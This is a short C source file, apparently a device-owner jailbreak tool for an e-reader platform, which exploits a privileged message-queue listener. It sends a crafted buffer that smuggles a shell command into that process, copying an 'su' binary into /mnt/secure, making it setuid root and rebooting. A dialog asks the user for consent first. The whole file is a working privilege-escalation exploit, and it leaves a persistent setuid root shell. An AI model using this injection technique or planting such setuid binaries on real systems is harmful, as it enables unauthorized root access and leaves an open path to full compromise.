#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>

#define SU "/mnt/secure/su"

int main(int argc, char *argv[]) {
	if (geteuid()==0) {
		setresuid(0,0,0);
		setresgid(0,0,0);
		return execve(argv[1], argv+1, environ); 
	}
	static char dummy[65536];
	static char buf[] =
		"\xff\xff\xff\x7f\x00\x00\x00\x00\x24\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\";cp                                                                           "
		SU ";chmod 755 /mnt/secure;chown 0:0 " SU " && chmod 4755 " SU ";/sbin/reboot;\"";
	char *prog = argv[0];
	for (int i = 0; *prog; i++)
		buf[i+25] = *prog++;
	if (strcmp(prog - 13, "Jailbreak.app"))
		return 1;
	system("iv2sh SetActiveTask `pidof bookshelf.app` 0");
	if (system("dialog 3 '' '"
		"Do you wish to jailbreak this device and permit root access?\n"
		"Device will reboot if the process succeeds.\n\n"
		"BEWARE: This may void warranty, depending on your country.' Yes No") != 256)
		return 0;
	int q = msgget(0xa1230f, 0);
	if (msgsnd(q, buf, sizeof(buf), 0) == 0)
		msgrcv(q, dummy, 0x10000, 0x7fffffff, 0);
	return 0;
}
